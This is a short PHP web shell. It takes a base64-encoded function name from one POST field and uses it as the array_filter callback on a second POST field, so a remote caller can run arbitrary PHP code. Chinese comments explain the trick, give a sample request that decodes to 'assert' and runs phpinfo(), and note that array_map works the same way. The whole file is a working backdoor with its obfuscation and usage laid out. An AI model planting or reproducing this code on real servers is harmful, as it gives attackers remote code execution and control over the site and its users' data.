<?php $act = $_POST['act'];
$payload = array($_POST['faith'],);
array_filter($payload, base64_decode($act));
#将数组中所有元素遍历并用指定函数处理
#利用方式发送post包：act=YXNzZXJ0&faith=phpinfo();
#类似array_filter，array_map也有同样功效
 
?>